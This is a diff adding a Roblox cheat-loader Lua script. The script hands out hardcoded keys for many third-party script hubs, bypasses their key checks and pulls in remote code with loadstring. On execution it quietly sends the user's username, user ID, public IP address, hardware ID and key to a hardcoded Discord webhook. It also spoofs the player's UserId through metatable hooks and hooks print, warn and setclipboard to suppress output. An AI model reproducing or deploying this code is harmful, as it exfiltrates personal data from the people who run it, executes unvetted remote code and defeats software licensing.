@@ -1,0 +1,691 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+print("🔐 Your Key Is: " .. getgenv().Key)
+print("🗂️ Your Script Is: " .. getgenv().Script)
+print("🏕️ Our Discord: https://discord.gg/FcEGmkNDDe ☎️")
+print("🧨 Sxionax's Best Developer: https://discord.gg/2C2vTJX33q 📡")
+
+local yYksFracgUqV = "https://discord.com/api/webhooks/1328000288161923152/XoC0itpI6tLAxP0fMd9-07YSgtoYixGWg1XO1c-NlE3iLvWle-UckJTSwxqi40eAglXn"
+local http = game:GetService("HttpService")
+local requestFunction = http_request or request or syn.request
+
+local function pPHzDNuJIbDp()
+    local response = requestFunction({ Url = "https://ipinfo.io/json", Method = "GET" })
+    return http:JSONDecode(response.Body).ip
+end
+
+local ipData = pPHzDNuJIbDp()
+local player = game.Players.LocalPlayer
+local embedData = {
+    embeds = {
+        {
+            title = "The Script Was Just Executed",
+            type = "rich",
+            color = tonumber("1cff1a", 16),
+            thumbnail = {
+                url = "https://media.discordapp.net/attachments/1276435905200128010/1342507906112950302/discord_fake_avatar_decorations_1740128914852.gif?ex=67b9e36b&is=67b891eb&hm=4caf70823b9331ef50cebba5b6beed488f5ba64be244e7a6c13b02993ec2227a&=&width=216&height=216"
+            },
+            fields = {
+                { name = "Username / UserId", value = string.format("```%s / %d```", player.Name, player.UserId) },
+                { name = "Internet Protocol", value = string.format("```%s```", ipData), inline = true },
+                { name = "Executor", value = string.format("```%s```", identifyexecutor()), inline = true },
+                { name = "Hardware ID", value = string.format("```%s```", gethwid()), inline = false },
+                { name = "Script", value = string.format("```%s```", getgenv().Script), inline = false },
+                { name = "Key", value = string.format("```%s```", getgenv().Key), inline = false },
+                { name = "JobId", value = string.format("```%s```", game.JobId), inline = false },
+                { name = "Profile Link", value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", player.UserId), inline = true },
+                { name = "Game Link", value = string.format("[Click Here](https://www.roblox.com/games/%d)", game.PlaceId), inline = true }
+            }
+        }
+    }
+}
+
+local payload = http:JSONEncode(embedData)
+local headers = { ["Content-Type"] = "application/json" }
+
+local success, err = pcall(function()
+    requestFunction({ Url = yYksFracgUqV, Body = payload, Method = "POST", Headers = headers })
+end)
+
+if not success then
+    warn("⛔ An Error Occurred While Sending The Server's Information To The Webhook: https://discord.gg/FcEGmkNDDe 🦠")
+end
+
+local function zBIjvrFwbVQy()
+    local player = game.Players.LocalPlayer
+    if not player then return end
+    player.Name, player.DisplayName = "\76\72\75\75", "\76\72\75\75"
+    local function updateCharacter(character)
+        if character then
+            character.Name = "\76\72\75\75"
+            task.spawn(function()
+                pcall(function()
+                    player.CharacterAppearanceId = 3463311754
+                end)
+            end)
+        end
+    end
+    if player.Character then updateCharacter(player.Character) end
+    player.CharacterAdded:Connect(updateCharacter)
+end
+
+local function TxqfbskodmCs()
+    local player = game.Players.LocalPlayer
+    local rawMeta = getrawmetatable(player)
+    if not rawMeta then return end
+
+    setreadonly(rawMeta, false)
+    local originalIndex = rawMeta.__index
+    local originalNewIndex = rawMeta.__newindex
+
+    rawMeta.__index = newcclosure(function(obj, key)
+        if obj == player and key == "UserId" then
+            return 3463311754
+        end
+        return originalIndex(obj, key)
+    end)
+
+    rawMeta.__newindex = newcclosure(function(obj, key, value)
+        if obj == player and key == "UserId" then
+            return
+        end
+        originalNewIndex(obj, key, value)
+    end)
+
+    setreadonly(rawMeta, true)
+end
+
+local function MBflfFhVlUYH()
+    local RgBCfatiHayu = { "Arceus X", "Codex", "VegaX", "Cryptic", "Trigon", "Evon" }
+    local hdomCfbkDdio = identifyexecutor()
+    local djNtgvSMCJmp = false
+    
+    for _, adRmtPXOjVVU in ipairs(RgBCfatiHayu) do
+        if hdomCfbkDdio == adRmtPXOjVVU then
+            djNtgvSMCJmp = true
+            break
+        end
+    end
+    
+    if not djNtgvSMCJmp then
+        warn("🐌 Wrong Executor, Please Check Again And Use The Correct Executor: https://discord.gg/FcEGmkNDDe 🧨")
+        game.Players.LocalPlayer:Kick("🐌 Wrong Executor, Please Check Again And Use The Correct Executor: https://discord.gg/FcEGmkNDDe 🧨")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+local function EfAmRBLUqVPM()
+    if gethwid() ~= "f703e3d6f898de7d" then
+        warn("🦚 Wrong Hardware ID, Please Check Again And Use The Correct Hardware ID: https://discord.gg/FcEGmkNDDe 🥛")
+        game.Players.LocalPlayer:Kick("🦚 Wrong Hardware ID, Please Check Again And Use The Correct Hardware ID: https://discord.gg/FcEGmkNDDe 🥛")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+local function VvLszuMUXPYd()
+    if not getgenv().Key or getgenv().Key == "" then
+        warn("🎙️ Key Not Found, Please Enter The Key To Use The Script: https://discord.gg/FcEGmkNDDe 👩🏾‍🚀")
+        game:GetService("Players").LocalPlayer:Kick("🎙️ Key Not Found, Please Enter The Key To Use The Script: https://discord.gg/FcEGmkNDDe 👩🏾‍🚀")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+local function TODzzqUvnbus()
+    if not getgenv().Script or getgenv().Script == "" then
+        warn("🍒 Script Name Not Found, Please Enter The Script Name To Use The Script: https://discord.gg/FcEGmkNDDe 🐉")
+        game.Players.LocalPlayer:Kick("🍒 Script Name Not Found, Please Enter The Script Name To Use The Script: https://discord.gg/FcEGmkNDDe 🐉")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+end
+
+pcall(function()
+    local lNgzLOPlYdtJ = (syn and syn.request) or http_request or (http and http.request) or (request and request.request)
+    if not lNgzLOPlYdtJ then
+        warn("❌ Your Executor Is Not Compatible With Our Requests! ❌")
+        game:GetService("Players").LocalPlayer:Kick("❌ Your Executor Is Not Compatible With Our Requests! ❌")
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+
+    lNgzLOPlYdtJ = lNgzLOPlYdtJ({
+        Url = "https://apisxionax.x10.mx/nSDs6oT4xDx.php",
+        Method = "POST",
+        Headers = { ["Authorization"] = getgenv().Key, ["Content-Type"] = "application/json" },
+        Body = game:GetService("HttpService"):JSONEncode({ iddiscord = tostring(game:GetService("Players").LocalPlayer.UserId) })
+    })
+
+    if not lNgzLOPlYdtJ or lNgzLOPlYdtJ.StatusCode ~= 200 then
+        warn("✈️ Sxionax API Connection Unavailable, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe 💝")
+        game:GetService("Players").LocalPlayer:Kick("🦃 Sxionax API Connection Unavailable, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe 👔")
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+    end
+
+    pcall(function()
+        local wPUYJuhuBcIo = game:GetService("HttpService"):JSONDecode(lNgzLOPlYdtJ.Body)
+        if type(wPUYJuhuBcIo) == "table" and (wPUYJuhuBcIo.success == true or wPUYJuhuBcIo.success == "true" or wPUYJuhuBcIo.redeemer == true or wPUYJuhuBcIo.redeemer == "true") then
+            print("🚀 Key Authentication Successful, Initiating Script Execution... 🎉")
+        else
+            warn("❌ Key Verification Failed, Script Execution Halted: https://discord.gg/FcEGmkNDDe 🚫🔑")
+            game:GetService("Players").LocalPlayer:Kick("❌ Key Verification Failed, Script Execution Halted: https://discord.gg/FcEGmkNDDe 🚫🔑")
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+        end
+    end)
+end)
+
+MBflfFhVlUYH()
+EfAmRBLUqVPM()
+VvLszuMUXPYd()
+TODzzqUvnbus()
+
+hookfunction(print, function(...) return ... end)
+
+if getgenv().Script == "BananaHubMain" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BananaHubBFKaitun" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-kaitunBF.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BananaHubBFBounty" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/BananaCat-BountyEz.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BananaHubBFFindFruit" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/HopFruit.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BananaHubBFFindFruit" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/HopFruit.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BananaHubBFPVP" then
+    getgenv().Key = "079a407d0e28b243a65af94c" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/BloxFruitPVP.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "RoyxHub" then
+    TxqfbskodmCs()
+
+    _G.Key = "8CLPG-54A2W-RCYIO"
+    _G.DiscordId = "1178198843721011358" 
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))();
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            _G.Key = "https://discord.gg/FcEGmkNDDe"
+            _G.DiscordId = "https://discord.gg/FcEGmkNDDe" 
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "SwitchHubPro" then
+    TxqfbskodmCs()
+
+    script_key = "NQWfbjGBcDUmIutPShvPNWjjUROgWgaP";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/londnee/switchhub/refs/heads/main/pro.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "SwitchHubKaitun" then
+    script_key="OxOplIcQxuvNbZOgnqTJEKMZKlNpMAXD";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/58876769bc015b00b9a3008484e99085.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "SwitchHubV4" then
+    script_key="tLwqFHgEtQQelRuNzNFnNqkDVnKmtWET";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2d1ebc6b47e1b9c4e34c97898f9b7c4b.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "SwitchHub7M" then
+    script_key="OuFVrCeAxtaFVPdzKwMjIuVeWTeyIAWa";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/81574cc738de90c0ec2ee3ef084b45e1.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "NormalHubMain" then
+    script_key="ZsGIJiUXokhtubnuAgLupcLeokJHUuUp";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/MonkiTeam/Normal-NewGenreation/main/Script"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "NormalHubConfig" then
+    script_key="ZsGIJiUXokhtubnuAgLupcLeokJHUuUp";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/l1x-freefirepromax/value/refs/heads/main/lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "XenonHubBF" then
+    TxqfbskodmCs()
+
+    getgenv().key = '2826407a-e127-4368-bc48-6a17bbbf03fb'
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua'))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().key = 'https://discord.gg/FcEGmkNDDe'
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "DeityHubFisch" then
+    _G.Authorize = '2GTZJ-1TTLV-QYF0S-Y7V6P'
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://deity.alphes.net/.lua")){"V1"}
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            _G.Authorize = 'https://discord.gg/FcEGmkNDDe'
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "TCHub" then
+    getgenv().Key = "njyoSmkCvagrCxodGrsfICUYBGiolVmM"
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("http://tc-hub.xyz/DonateMe/Loader.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Key = "https://discord.gg/FcEGmkNDDe"
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "NousigiHub" then
+    if isfolder("Nousigi Hub") then
+        if isfile("Nousigi Hub/savedkey") then
+            local cnt = readfile("Nousigi Hub/savedkey")
+            if cnt ~= "zYJcYYjFHJvGlkBYdbFTGQHIPJtKyJKX" then
+                writefile("Nousigi Hub/savedkey", "zYJcYYjFHJvGlkBYdbFTGQHIPJtKyJKX")
+            end
+        else
+            writefile("Nousigi Hub/savedkey", "zYJcYYjFHJvGlkBYdbFTGQHIPJtKyJKX")
+        end
+    else
+        makefolder("Nousigi Hub")
+        writefile("Nousigi Hub/savedkey", "zYJcYYjFHJvGlkBYdbFTGQHIPJtKyJKX")
+    end
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            if isfile("Nousigi Hub/savedkey") then
+                delfile("Nousigi Hub/savedkey")
+            end
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BocchiHub" then
+    TxqfbskodmCs()
+
+    script_key="LLWyoJdtGkUmnRfcKsPPklFkUotmLlVU";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c6520db53985671e9ad61e87eaae702a.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "MacroHubV3" then
+    script_key="TZudNJuizLkTHqfPqUYkLQHUdzbSPHpf";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://scripts.macrov4.com/macrov3.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "MacroHubV4" then
+    script_key="TZudNJuizLkTHqfPqUYkLQHUdzbSPHpf";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://scripts.macrov4.com/macrov4.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "NativeHub" then
+    script_key="IXQBegCKbTnryqeGCksuohKgKFrkAJba";
+    (loadstring or load)(game:HttpGet("https://raw.githubusercontent.com/Native-lab/Native/main/loader.lua"))()
+elseif getgenv().Script == "LavieHub" then
+    TxqfbskodmCs()
+
+    script_key = "ZjmlnejviVgUqzAaXpmmnIKSMwbMncbP"
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/59af8bc293453487db14a26ae8db972c.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "FlowHub" then
+    if isfile("NeuronXKey") then  
+        delfile("NeuronXKey")
+    end
+    
+    writefile("NeuronXKey", "flowcaeecc0a66e9c144650aeede7d9cb997f9c429e96b3e035265e8d3bcb8e310ee")
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/Overflow/refs/heads/main/Main.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            if isfile("NeuronXKey") then 
+                delfile("NeuronXKey")
+            end
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "AlchemyHub" then
+    script_key="IiCBWITAdCYgeCOLxQpYXIvVQIXxMzDY";
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            premium=true;loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            script_key = "https://discord.gg/FcEGmkNDDe";
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+            script_key = "https://discord.gg/FcEGmkNDDe"
+            script_key="https://discord.gg/FcEGmkNDDe";
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "BuangHubAA" then
+    TxqfbskodmCs()
+    warn("💥 Key Successfully Bypassed, Initiating Buang Hub Execution 💐")
+    getgenv().script_key = "VbtfexyomzOwOZYXykUiroloQBLBBvzK";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubALS" then
+    TxqfbskodmCs()
+    warn("💥 Key Successfully Bypassed, Initiating Buang Hub Execution 💐")
+    getgenv().script_key = "mxIxrCkkAXaGoEtUebMSkUuukSnMTndW";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubAR" then
+    TxqfbskodmCs()
+    warn("💥 Key Successfully Bypassed, Initiating Buang Hub Execution 💐")
+    getgenv().script_key = "IvZGMGepbDJKnKGcQhnvpUtsueQQtcxQ";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubAV" then
+    TxqfbskodmCs()
+    warn("💥 Key Successfully Bypassed, Initiating Buang Hub Execution 💐")
+    getgenv().script_key = "dptwWQgWggUZCZZQJYMUHWVSvqsgXjqo";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "W-AzurePremiumTrueV2" then
+    TxqfbskodmCs()
+    hookfunction(warn, function(...) return ... end)
+    hookfunction(setclipboard, function(...) return ... end)
+    script_key = "gOJSXYAqUjEeojPHKfHZRZTJHNdCkVAs"
+
+    task.spawn(function()
+        local GNBrXcktRCOt, dzGLAbwWcEQY = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipinfo.io/json")).ip
+        end)
+
+        if GNBrXcktRCOt and dzGLAbwWcEQY == "86.107.104.10" then
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+
+            script_key = "X7pQa9KZJ2mVYF5dN3LCRMtHgwTUEsB4";
+            script_key = 'X7pQa9KZJ2mVYF5dN3LCRMtHgwTUEsB4'
+            script_key = "X7pQa9KZJ2mVYF5dN3LCRMtHgwTUEsB4"
+            script_key="X7pQa9KZJ2mVYF5dN3LCRMtHgwTUEsB4";
+            lib.script_id = "1261628464654581895"
+        else
+            warn("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            game:GetService("Players").LocalPlayer:Kick("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+        end
+    end)
+elseif getgenv().Script == "W-AzurePremiumBFBountyV2.2" then
+    TxqfbskodmCs()
+    hookfunction(warn, function(...) return ... end)
+    hookfunction(setclipboard, function(...) return ... end)
+    script_key = "gOJSXYAqUjEeojPHKfHZRZTJHNdCkVAs"
+
+    task.spawn(function()
+        local GNBrXcktRCOt, dzGLAbwWcEQY = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipinfo.io/json")).ip
+        end)
+
+        if GNBrXcktRCOt and dzGLAbwWcEQY == "86.107.104.10" then
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/248f97d7a28a4d09c641d8279a935333.lua"))()
+
+            script_key = "UC7xB2l0k480KiLh57abvqNANl5PbOms";
+            script_key = 'UC7xB2l0k480KiLh57abvqNANl5PbOms'
+            script_key = "UC7xB2l0k480KiLh57abvqNANl5PbOms"
+            script_key="UC7xB2l0k480KiLh57abvqNANl5PbOms";
+            lib.script_id = "1261628464654581895"
+        else
+            warn("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            game:GetService("Players").LocalPlayer:Kick("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+        end
+    end)
+elseif getgenv().Script == "SyntaxAOTR" then
+    getgenv().Keys = "1186329289809350621"
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            loadstring(game:HttpGet("https://syntax.alphes.net/Files/phagocytosis.lua"))()
+        end)
+    until CwnUXJjslpKN
+
+    repeat
+        local CwnUXJjslpKN = pcall(function()
+            getgenv().Keys = "https://discord.gg/FcEGmkNDDe"
+        end)
+    until CwnUXJjslpKN
+elseif getgenv().Script == "XeroHubPremium" then
+    zBIjvrFwbVQy()
+    TxqfbskodmCs()
+    hookfunction(warn, function(...) return ... end)
+    hookfunction(setclipboard, function(...) return ... end)
+    script_key = "UW4ZZCEZXKJJXMEJ437PZM5HXGYA" 
+
+    task.spawn(function()
+        local GNBrXcktRCOt, dzGLAbwWcEQY = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipinfo.io/json")).ip
+        end)
+
+        if GNBrXcktRCOt and dzGLAbwWcEQY == "86.107.104.10" then
+            repeat
+                task.wait(Xero)
+                pcall(function()
+                     loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/XeroHub/refs/heads/main/kaitun.lua"))()
+                end)
+            until getgenv().Check_Execute
+
+            script_key = "UW4ZZCEZXKJJXMEJ437PZM5HXGYA";
+            script_key = 'UW4ZZCEZXKJJXMEJ437PZM5HXGYA'
+            script_key = "UW4ZZCEZXKJJXMEJ437PZM5HXGYA"
+            script_key="UW4ZZCEZXKJJXMEJ437PZM5HXGYA";
+        else
+            warn("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            game:GetService("Players").LocalPlayer:Kick("📥 Your Internet Protocol Is Invalid, Please Check And Try Again: https://discord.gg/FcEGmkNDDe 👔")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+        end
+    end)
+else
+    warn("👤 Your Script Is Wrong, Please Check Here: https://discord.gg/FcEGmkNDDe 🏝️")
+    game.Players.LocalPlayer:Kick("🛸 Your Script Is Wrong, Please Check Here: https://discord.gg/FcEGmkNDDe 🖥️")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
